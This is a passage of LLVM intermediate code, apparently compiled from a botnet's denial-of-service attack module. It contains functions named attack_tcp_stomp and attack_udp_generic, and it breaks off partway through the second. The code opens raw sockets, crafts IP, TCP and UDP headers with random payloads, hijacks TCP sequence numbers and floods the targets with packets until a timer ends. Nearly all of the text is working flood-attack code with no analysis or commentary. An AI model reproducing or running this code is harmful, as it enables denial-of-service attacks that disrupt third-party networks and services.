  %102 = bitcast i8* %101 to i16*
  store i16 %100, i16* %102, align 4
  %103 = getelementptr inbounds i8, i8* %91, i64 8
  store i8 %15, i8* %103, align 4
  br i1 %53, label %108, label %104

; <label>:104:                                    ; preds = %89
  %105 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %106 = getelementptr inbounds i8, i8* %91, i64 6
  %107 = bitcast i8* %106 to i16*
  store i16 %105, i16* %107, align 2
  br label %108

; <label>:108:                                    ; preds = %89, %104
  %109 = getelementptr inbounds i8, i8* %91, i64 9
  store i8 6, i8* %109, align 1
  %110 = getelementptr inbounds i8, i8* %91, i64 12
  %111 = bitcast i8* %110 to i32*
  store i32 %40, i32* %111, align 4
  %112 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %92, i32 1
  %113 = load i32, i32* %112, align 4
  %114 = getelementptr inbounds i8, i8* %91, i64 16
  %115 = bitcast i8* %114 to i32*
  store i32 %113, i32* %115, align 4
  %116 = call zeroext i16 @htons(i16 zeroext %19) #11
  %117 = bitcast i8* %94 to i16*
  store i16 %116, i16* %117, align 4
  %118 = call zeroext i16 @htons(i16 zeroext %21) #11
  %119 = getelementptr inbounds i8, i8* %91, i64 22
  %120 = bitcast i8* %119 to i16*
  store i16 %118, i16* %120, align 2
  %121 = call zeroext i16 @htons(i16 zeroext %54) #11
  %122 = zext i16 %121 to i32
  %123 = getelementptr inbounds i8, i8* %91, i64 24
  %124 = bitcast i8* %123 to i32*
  store i32 %122, i32* %124, align 4
  %125 = getelementptr inbounds i8, i8* %91, i64 32
  %126 = bitcast i8* %125 to i16*
  store i16 %., i16* %126, align 4
  call void @rand_alphastr(i8* nonnull %95, i32 %36)
  %127 = getelementptr inbounds i8, i8* %95, i64 %.pre137
  store i8 0, i8* %127, align 1
  %128 = load i32, i32* %6, align 4
  %129 = add nsw i32 %128, 1
  store i32 %129, i32* %6, align 4
  %130 = icmp slt i32 %129, %50
  br i1 %130, label %89, label %.preheader.loopexit

; <label>:131:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %51, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %131
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %174
  %storemerge127135 = phi i32 [ %193, %174 ], [ 0, %.lr.ph.preheader ]
  %132 = sext i32 %storemerge127135 to i64
  %133 = getelementptr inbounds i8*, i8** %9, i64 %132
  %134 = load i8*, i8** %133, align 8
  %135 = bitcast i8* %134 to %struct.iphdr*
  %136 = getelementptr inbounds i8, i8* %134, i64 20
  %137 = getelementptr inbounds i8, i8* %134, i64 40
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %132, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = icmp ult i8 %139, 32
  br i1 %140, label %141, label %148

; <label>:141:                                    ; preds = %.lr.ph
  %142 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %132, i32 1
  %143 = load i32, i32* %142, align 4
  %144 = call i32 @ntohl(i32 %143) #11
  %145 = call i32 @htonl(i32 %144) #11
  %146 = getelementptr inbounds i8, i8* %134, i64 16
  %147 = bitcast i8* %146 to i32*
  store i32 %145, i32* %147, align 4
  br label %148

; <label>:148:                                    ; preds = %141, %.lr.ph
  br i1 %76, label %149, label %152

; <label>:149:                                    ; preds = %148
  %150 = getelementptr inbounds i8, i8* %134, i64 12
  %151 = bitcast i8* %150 to i32*
  store i32 0, i32* %151, align 4
  br label %152

; <label>:152:                                    ; preds = %149, %148
  br i1 %78, label %153, label %156

; <label>:153:                                    ; preds = %152
  %154 = getelementptr inbounds i8, i8* %134, i64 4
  %155 = bitcast i8* %154 to i16*
  store i16 0, i16* %155, align 4
  br label %156

; <label>:156:                                    ; preds = %153, %152
  br i1 %80, label %157, label %159

; <label>:157:                                    ; preds = %156
  %158 = bitcast i8* %136 to i16*
  store i16 0, i16* %158, align 4
  br label %159

; <label>:159:                                    ; preds = %157, %156
  br i1 %82, label %160, label %163

; <label>:160:                                    ; preds = %159
  %161 = getelementptr inbounds i8, i8* %134, i64 22
  %162 = bitcast i8* %161 to i16*
  store i16 0, i16* %162, align 2
  br label %163

; <label>:163:                                    ; preds = %160, %159
  br i1 %83, label %164, label %167

; <label>:164:                                    ; preds = %163
  %165 = getelementptr inbounds i8, i8* %134, i64 24
  %166 = bitcast i8* %165 to i32*
  store i32 0, i32* %166, align 4
  br label %167

; <label>:167:                                    ; preds = %164, %163
  br i1 %84, label %168, label %171

; <label>:168:                                    ; preds = %167
  %169 = getelementptr inbounds i8, i8* %134, i64 28
  %170 = bitcast i8* %169 to i32*
  store i32 0, i32* %170, align 4
  br label %171

; <label>:171:                                    ; preds = %168, %167
  br i1 %85, label %174, label %172

; <label>:172:                                    ; preds = %171
  call void @rand_alphastr(i8* %137, i32 %36)
  %173 = getelementptr inbounds i8, i8* %137, i64 %.pre137
  store i8 0, i8* %173, align 1
  %.pre = load i32, i32* %6, align 4
  br label %174

; <label>:174:                                    ; preds = %171, %172
  %175 = phi i32 [ %storemerge127135, %171 ], [ %.pre, %172 ]
  %176 = getelementptr inbounds i8, i8* %134, i64 10
  %177 = bitcast i8* %176 to i16*
  store i16 0, i16* %177, align 2
  %178 = bitcast i8* %134 to i16*
  %179 = call zeroext i16 @checksum_generic(i16* %178, i32 20)
  store i16 %179, i16* %177, align 2
  %180 = getelementptr inbounds i8, i8* %134, i64 36
  %181 = bitcast i8* %180 to i16*
  store i16 0, i16* %181, align 4
  %182 = call zeroext i16 @htons(i16 zeroext %87) #11
  %183 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %135, i8* %136, i16 zeroext %182, i32 %88)
  store i16 %183, i16* %181, align 4
  %184 = getelementptr inbounds i8, i8* %134, i64 22
  %185 = bitcast i8* %184 to i16*
  %186 = load i16, i16* %185, align 2
  %187 = sext i32 %175 to i64
  %188 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %187, i32 0, i32 1
  store i16 %186, i16* %188, align 2
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %187, i32 0
  %190 = bitcast %struct.sockaddr_in* %189 to %struct.sockaddr*
  %191 = call i64 @sendto(i32 %44, i8* %134, i64 %.pre138, i32 16384, %struct.sockaddr* %190, i32 16) #10
  %192 = load i32, i32* %6, align 4
  %193 = add nsw i32 %192, 1
  store i32 %193, i32* %6, align 4
  %194 = icmp slt i32 %193, %50
  br i1 %194, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %174
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %131
  %195 = call i64 @time(i64* null) #10
  %196 = icmp sgt i64 %195, %75
  br i1 %196, label %.loopexit.loopexit, label %131

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %73
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = alloca [256 x i8], align 16
  store i32 0, i32* %6, align 4
  %11 = zext i8 %1 to i64
  %12 = tail call noalias i8* @calloc(i64 %11, i64 16) #10
  %13 = bitcast i8* %12 to %struct.attack_stomp_data*
  %14 = tail call noalias i8* @calloc(i64 %11, i64 8) #10
  %15 = bitcast i8* %14 to i8**
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %21 = trunc i32 %20 to i8
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 1)
  %23 = trunc i32 %22 to i8
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %25 = trunc i32 %24 to i16
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 10, i32 0)
  %27 = trunc i32 %26 to i16
  %28 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 11, i32 1)
  %29 = trunc i32 %28 to i16
  %30 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 12, i32 1)
  %31 = trunc i32 %30 to i16
  %32 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 13, i32 0)
  %33 = trunc i32 %32 to i16
  %34 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 14, i32 0)
  %35 = trunc i32 %34 to i16
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 15, i32 0)
  %37 = trunc i32 %36 to i16
  %38 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 768)
  %39 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %40 = trunc i32 %39 to i8
  %41 = tail call i64 @time(i64* null) #10
  %42 = zext i32 %0 to i64
  %43 = add i64 %41, %42
  %44 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %.loopexit, label %46

; <label>:46:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %47 = bitcast i32* %6 to i8*
  %48 = call i32 @setsockopt(i32 %44, i32 0, i32 3, i8* nonnull %47, i32 4) #10
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %86, label %.preheader160

.preheader160:                                    ; preds = %46
  store i32 0, i32* %6, align 4
  %50 = zext i8 %1 to i32
  %51 = icmp eq i8 %1, 0
  br i1 %51, label %.preheader160..preheader_crit_edge, label %.preheader158.lr.ph

.preheader160..preheader_crit_edge:               ; preds = %.preheader160
  %.pre173 = sext i32 %38 to i64
  %.pre174 = add nsw i64 %.pre173, 40
  br label %.preheader

.preheader158.lr.ph:                              ; preds = %.preheader160
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %54 = and i32 %24, 65535
  %55 = icmp eq i32 %54, 65535
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  %57 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %58 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %59 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2, i32 0
  %61 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 20
  %62 = bitcast i8* %61 to i16*
  %63 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 32
  %64 = bitcast i8* %63 to i16*
  %65 = sext i32 %38 to i64
  %66 = add nsw i64 %65, 40
  %67 = trunc i64 %66 to i16
  %68 = icmp eq i8 %23, 0
  %69 = shl i16 %27, 13
  %70 = and i16 %69, 8192
  %71 = shl i16 %29, 12
  %72 = and i16 %71, 4096
  %73 = shl i16 %31, 11
  %74 = and i16 %73, 2048
  %75 = shl i16 %33, 10
  %76 = and i16 %75, 1024
  %77 = shl i16 %35, 9
  %78 = and i16 %77, 512
  %79 = shl i16 %37, 8
  %80 = and i16 %79, 256
  %81 = or i16 %72, %70
  %82 = or i16 %81, %74
  %83 = or i16 %82, %76
  %.masked = or i16 %83, %78
  %84 = or i16 %.masked, %80
  %85 = or i16 %84, 128
  br label %.preheader158

; <label>:86:                                     ; preds = %46
  %87 = call i32 @close(i32 %44) #10
  br label %.loopexit

.preheader158:                                    ; preds = %.preheader158.lr.ph, %.loopexit159
  %.0169 = phi %struct.tcphdr* [ undef, %.preheader158.lr.ph ], [ %.1, %.loopexit159 ]
  %88 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %89 = icmp eq i32 %88, -1
  br i1 %89, label %.loopexit159, label %.lr.ph168.preheader

.lr.ph168.preheader:                              ; preds = %.preheader158
  br label %.lr.ph168

.preheader.loopexit:                              ; preds = %.loopexit159
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader160..preheader_crit_edge
  %.pre-phi175 = phi i64 [ %.pre174, %.preheader160..preheader_crit_edge ], [ %66, %.preheader.loopexit ]
  %.pre-phi = phi i64 [ %.pre173, %.preheader160..preheader_crit_edge ], [ %65, %.preheader.loopexit ]
  %sext = shl i64 %43, 32
  %90 = ashr exact i64 %sext, 32
  %91 = and i32 %18, 65535
  %92 = icmp eq i32 %91, 65535
  %93 = icmp eq i8 %40, 0
  %94 = add nsw i64 %.pre-phi, 20
  %95 = trunc i64 %94 to i16
  %96 = trunc i64 %94 to i32
  br label %204

.lr.ph168:                                        ; preds = %.lr.ph168.preheader, %.backedge
  %97 = phi i32 [ %193, %.backedge ], [ %88, %.lr.ph168.preheader ]
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i32 0) #10
  %99 = or i32 %98, 2048
  %100 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 4, i32 %99) #10
  store i16 2, i16* %52, align 4
  %101 = load i32, i32* %6, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %102, i32 2
  %104 = load i8, i8* %103, align 4
  %105 = icmp ult i8 %104, 32
  %106 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %102, i32 1
  %107 = load i32, i32* %106, align 4
  br i1 %105, label %108, label %111

; <label>:108:                                    ; preds = %.lr.ph168
  %109 = call i32 @ntohl(i32 %107) #11
  %110 = call i32 @htonl(i32 %109) #11
  br label %111

; <label>:111:                                    ; preds = %.lr.ph168, %108
  %.sink = phi i32 [ %110, %108 ], [ %107, %.lr.ph168 ]
  store i32 %.sink, i32* %53, align 4
  br i1 %55, label %114, label %112

; <label>:112:                                    ; preds = %111
  %113 = call zeroext i16 @htons(i16 zeroext %25) #11
  br label %114

; <label>:114:                                    ; preds = %111, %112
  %.sink3 = phi i16 [ %113, %112 ], [ 0, %111 ]
  store i16 %.sink3, i16* %56, align 2
  %115 = call i32 @connect(i32 %97, %struct.sockaddr* nonnull %57, i32 16) #10
  %116 = call i64 @time(i64* null) #10
  br label %117

; <label>:117:                                    ; preds = %195, %114
  store i32 16, i32* %9, align 4
  %118 = call i64 @recvfrom(i32 %44, i8* nonnull %58, i64 256, i32 16384, %struct.sockaddr* nonnull %59, i32* nonnull %9) #10
  %119 = trunc i64 %118 to i32
  %120 = icmp eq i32 %119, -1
  br i1 %120, label %.loopexit.loopexit186, label %121

; <label>:121:                                    ; preds = %117
  %122 = load i32, i32* %60, align 4
  %123 = load i32, i32* %53, align 4
  %124 = icmp eq i32 %122, %123
  br i1 %124, label %125, label %195

; <label>:125:                                    ; preds = %121
  %sext146 = shl i64 %118, 32
  %126 = ashr exact i64 %sext146, 32
  %127 = icmp ugt i64 %126, 40
  br i1 %127, label %128, label %195

; <label>:128:                                    ; preds = %125
  %129 = load i16, i16* %62, align 4
  %130 = load i16, i16* %56, align 2
  %131 = icmp eq i16 %129, %130
  br i1 %131, label %132, label %195

; <label>:132:                                    ; preds = %128
  %133 = load i16, i16* %64, align 16
  %134 = and i16 %133, 4608
  %135 = icmp eq i16 %134, 4608
  br i1 %135, label %136, label %188

; <label>:136:                                    ; preds = %132
  %137 = load i32, i32* %6, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %138, i32 0
  store i32 %122, i32* %139, align 4
  %140 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0169, i64 0, i32 2
  %141 = load i32, i32* %140, align 4
  %142 = call i32 @ntohl(i32 %141) #11
  %143 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %138, i32 1
  store i32 %142, i32* %143, align 4
  %144 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0169, i64 0, i32 3
  %145 = load i32, i32* %144, align 4
  %146 = call i32 @ntohl(i32 %145) #11
  %147 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %138, i32 2
  store i32 %146, i32* %147, align 4
  %148 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0169, i64 0, i32 1
  %149 = load i16, i16* %148, align 2
  %150 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %138, i32 3
  store i16 %149, i16* %150, align 4
  %151 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %138, i32 4
  store i16 %129, i16* %151, align 2
  %152 = call noalias i8* @malloc(i64 %66) #10
  %153 = getelementptr inbounds i8*, i8** %15, i64 %138
  store i8* %152, i8** %153, align 8
  %154 = getelementptr inbounds i8, i8* %152, i64 20
  %155 = bitcast i8* %154 to %struct.tcphdr*
  %156 = getelementptr inbounds i8, i8* %152, i64 40
  store i8 69, i8* %152, align 4
  %157 = getelementptr inbounds i8, i8* %152, i64 1
  store i8 %17, i8* %157, align 1
  %158 = call zeroext i16 @htons(i16 zeroext %67) #11
  %159 = getelementptr inbounds i8, i8* %152, i64 2
  %160 = bitcast i8* %159 to i16*
  store i16 %158, i16* %160, align 2
  %161 = call zeroext i16 @htons(i16 zeroext %19) #11
  %162 = getelementptr inbounds i8, i8* %152, i64 4
  %163 = bitcast i8* %162 to i16*
  store i16 %161, i16* %163, align 4
  %164 = getelementptr inbounds i8, i8* %152, i64 8
  store i8 %21, i8* %164, align 4
  br i1 %68, label %169, label %165

; <label>:165:                                    ; preds = %136
  %166 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %167 = getelementptr inbounds i8, i8* %152, i64 6
  %168 = bitcast i8* %167 to i16*
  store i16 %166, i16* %168, align 2
  br label %169

; <label>:169:                                    ; preds = %136, %165
  %170 = getelementptr inbounds i8, i8* %152, i64 9
  store i8 6, i8* %170, align 1
  %171 = load i32, i32* @LOCAL_ADDR, align 4
  %172 = getelementptr inbounds i8, i8* %152, i64 12
  %173 = bitcast i8* %172 to i32*
  store i32 %171, i32* %173, align 4
  %174 = getelementptr inbounds i8, i8* %152, i64 16
  %175 = bitcast i8* %174 to i32*
  store i32 %122, i32* %175, align 4
  %176 = bitcast i8* %154 to i16*
  store i16 %149, i16* %176, align 4
  %177 = getelementptr inbounds i8, i8* %152, i64 22
  %178 = bitcast i8* %177 to i16*
  store i16 %129, i16* %178, align 2
  %179 = getelementptr inbounds i8, i8* %152, i64 24
  %180 = bitcast i8* %179 to i32*
  store i32 %146, i32* %180, align 4
  %181 = getelementptr inbounds i8, i8* %152, i64 28
  %182 = bitcast i8* %181 to i32*
  store i32 %142, i32* %182, align 4
  %183 = getelementptr inbounds i8, i8* %152, i64 32
  %184 = bitcast i8* %183 to i16*
  %185 = getelementptr inbounds i8, i8* %152, i64 34
  %186 = bitcast i8* %185 to i16*
  store i16 0, i16* %186, align 2
  store i16 %85, i16* %184, align 4
  call void @rand_alphastr(i8* %156, i32 %38)
  %187 = getelementptr inbounds i8, i8* %156, i64 %65
  store i8 0, i8* %187, align 1
  br label %.loopexit159

; <label>:188:                                    ; preds = %132
  %189 = and i16 %133, 1280
  %190 = icmp eq i16 %189, 0
  br i1 %190, label %195, label %191

; <label>:191:                                    ; preds = %188
  %192 = call i32 @close(i32 %97) #10
  br label %.backedge

.backedge:                                        ; preds = %191, %199
  %193 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %194 = icmp eq i32 %193, -1
  br i1 %194, label %.loopexit159.loopexit, label %.lr.ph168

; <label>:195:                                    ; preds = %188, %128, %125, %121
  %196 = call i64 @time(i64* null) #10
  %197 = sub nsw i64 %196, %116
  %198 = icmp sgt i64 %197, 10
  br i1 %198, label %199, label %117

; <label>:199:                                    ; preds = %195
  %200 = call i32 @close(i32 %97) #10
  br label %.backedge

.loopexit159.loopexit:                            ; preds = %.backedge
  br label %.loopexit159

.loopexit159:                                     ; preds = %.loopexit159.loopexit, %.preheader158, %169
  %.1 = phi %struct.tcphdr* [ %155, %169 ], [ %.0169, %.preheader158 ], [ %.0169, %.loopexit159.loopexit ]
  %201 = load i32, i32* %6, align 4
  %202 = add nsw i32 %201, 1
  store i32 %202, i32* %6, align 4
  %203 = icmp slt i32 %202, %50
  br i1 %203, label %.preheader158, label %.preheader.loopexit

; <label>:204:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %51, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %204
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %217
  %storemerge145167 = phi i32 [ %251, %217 ], [ 0, %.lr.ph.preheader ]
  %205 = sext i32 %storemerge145167 to i64
  %206 = getelementptr inbounds i8*, i8** %15, i64 %205
  %207 = load i8*, i8** %206, align 8
  %208 = bitcast i8* %207 to %struct.iphdr*
  %209 = getelementptr inbounds i8, i8* %207, i64 20
  %210 = getelementptr inbounds i8, i8* %207, i64 40
  br i1 %92, label %211, label %214

; <label>:211:                                    ; preds = %.lr.ph
  %212 = getelementptr inbounds i8, i8* %207, i64 4
  %213 = bitcast i8* %212 to i16*
  store i16 0, i16* %213, align 4
  br label %214

; <label>:214:                                    ; preds = %211, %.lr.ph
  br i1 %93, label %217, label %215

; <label>:215:                                    ; preds = %214
  call void @rand_alphastr(i8* %210, i32 %38)
  %216 = getelementptr inbounds i8, i8* %210, i64 %.pre-phi
  store i8 0, i8* %216, align 1
  %.pre = load i32, i32* %6, align 4
  br label %217

; <label>:217:                                    ; preds = %214, %215
  %218 = phi i32 [ %storemerge145167, %214 ], [ %.pre, %215 ]
  %219 = getelementptr inbounds i8, i8* %207, i64 10
  %220 = bitcast i8* %219 to i16*
  store i16 0, i16* %220, align 2
  %221 = bitcast i8* %207 to i16*
  %222 = call zeroext i16 @checksum_generic(i16* %221, i32 20)
  store i16 %222, i16* %220, align 2
  %223 = sext i32 %218 to i64
  %224 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %223, i32 1
  %225 = load i32, i32* %224, align 4
  %226 = add i32 %225, 1
  store i32 %226, i32* %224, align 4
  %227 = trunc i32 %225 to i16
  %228 = call zeroext i16 @htons(i16 zeroext %227) #11
  %229 = zext i16 %228 to i32
  %230 = getelementptr inbounds i8, i8* %207, i64 24
  %231 = bitcast i8* %230 to i32*
  store i32 %229, i32* %231, align 4
  %232 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %13, i64 %223, i32 2
  %233 = load i32, i32* %232, align 4
  %234 = trunc i32 %233 to i16
  %235 = call zeroext i16 @htons(i16 zeroext %234) #11
  %236 = zext i16 %235 to i32
  %237 = getelementptr inbounds i8, i8* %207, i64 28
  %238 = bitcast i8* %237 to i32*
  store i32 %236, i32* %238, align 4
  %239 = getelementptr inbounds i8, i8* %207, i64 36
  %240 = bitcast i8* %239 to i16*
  store i16 0, i16* %240, align 4
  %241 = call zeroext i16 @htons(i16 zeroext %95) #11
  %242 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %208, i8* %209, i16 zeroext %241, i32 %96)
  store i16 %242, i16* %240, align 4
  %243 = getelementptr inbounds i8, i8* %207, i64 22
  %244 = bitcast i8* %243 to i16*
  %245 = load i16, i16* %244, align 2
  %246 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %223, i32 0, i32 1
  store i16 %245, i16* %246, align 2
  %247 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %223, i32 0
  %248 = bitcast %struct.sockaddr_in* %247 to %struct.sockaddr*
  %249 = call i64 @sendto(i32 %44, i8* %207, i64 %.pre-phi175, i32 16384, %struct.sockaddr* %248, i32 16) #10
  %250 = load i32, i32* %6, align 4
  %251 = add nsw i32 %250, 1
  store i32 %251, i32* %6, align 4
  %252 = icmp slt i32 %251, %50
  br i1 %252, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %217
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %204
  %253 = call i64 @time(i64* null) #10
  %254 = icmp sgt i64 %253, %90
  br i1 %254, label %.loopexit.loopexit, label %204

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit.loopexit186:                            ; preds = %117
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit186, %.loopexit.loopexit, %5, %86
  ret void
}

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) local_unnamed_addr #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 512)
  %23 = trunc i32 %22 to i16
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %25 = trunc i32 %24 to i8
  %26 = load i32, i32* @LOCAL_ADDR, align 4
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 24, i32 %26)
  %28 = tail call i64 @time(i64* null) #10
  %29 = zext i32 %0 to i64
  %30 = add i64 %28, %29
  %31 = and i32 %22, 65535
  %32 = icmp ugt i32 %31, 1460
  %. = select i1 %32, i16 1460, i16 %23
  %33 = tail call i32 @socket(i32 2, i32 3, i32 17) #10
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %.loopexit, label %35

; <label>:35:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %36 = bitcast i32* %6 to i8*
  %37 = call i32 @setsockopt(i32 %33, i32 0, i32 3, i8* nonnull %36, i32 4) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %45, label %.preheader88

.preheader88:                                     ; preds = %35
  store i32 0, i32* %6, align 4
  %39 = zext i8 %1 to i32
  %40 = icmp eq i8 %1, 0
  br i1 %40, label %.preheader, label %.lr.ph90

.lr.ph90:                                         ; preds = %.preheader88
  %41 = add i16 %., 28
  %42 = icmp eq i8 %17, 0
  %43 = add i16 %., 8
  %44 = zext i8 %1 to i64
  br label %62

; <label>:45:                                     ; preds = %35
  %46 = call i32 @close(i32 %33) #10
  br label %.loopexit

..preheader_crit_edge:                            ; preds = %78
  %47 = trunc i64 %indvars.iv.next to i32
  store i32 %47, i32* %6, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader88, %..preheader_crit_edge
  %sext = shl i64 %30, 32
  %48 = ashr exact i64 %sext, 32
  %49 = icmp eq i32 %27, -1
  %50 = and i32 %12, 65535
  %51 = icmp eq i32 %50, 65535
  %52 = and i32 %18, 65535
  %53 = icmp eq i32 %52, 65535
  %54 = and i32 %20, 65535
  %55 = icmp eq i32 %54, 65535
  %56 = icmp eq i8 %25, 0
  %57 = zext i16 %. to i64
  %58 = add nuw nsw i64 %57, 8
  %59 = trunc i64 %58 to i32
  %60 = add nuw nsw i64 %57, 28
  %61 = zext i16 %. to i32
  br label %95

; <label>:62:                                     ; preds = %.lr.ph90, %78
  %indvars.iv = phi i64 [ 0, %.lr.ph90 ], [ %indvars.iv.next, %78 ]
  %63 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %64 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv
  store i8* %63, i8** %64, align 8
  %65 = getelementptr inbounds i8, i8* %63, i64 20
  store i8 69, i8* %63, align 4
  %66 = getelementptr inbounds i8, i8* %63, i64 1
  store i8 %11, i8* %66, align 1
  %67 = call zeroext i16 @htons(i16 zeroext %41) #11
  %68 = getelementptr inbounds i8, i8* %63, i64 2
  %69 = bitcast i8* %68 to i16*
